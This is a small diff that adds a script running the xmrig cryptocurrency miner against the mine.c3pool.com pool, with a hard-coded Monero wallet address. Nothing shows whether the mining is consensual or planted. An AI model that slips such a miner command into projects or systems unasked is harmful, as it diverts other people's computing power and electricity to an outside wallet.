@@ -1,0 +1,2 @@
+xmrig.exe -o mine.c3pool.com:13333 -u 49mWCojq6tpDTX6Px5uKXZJV8jhq7G4yUXav2JTPJ7q3c4vckgKbdsvPNovjp1nmv8ejNzX6BHvDZ3QieX2ZDMntF11zS3t -p x
+pause
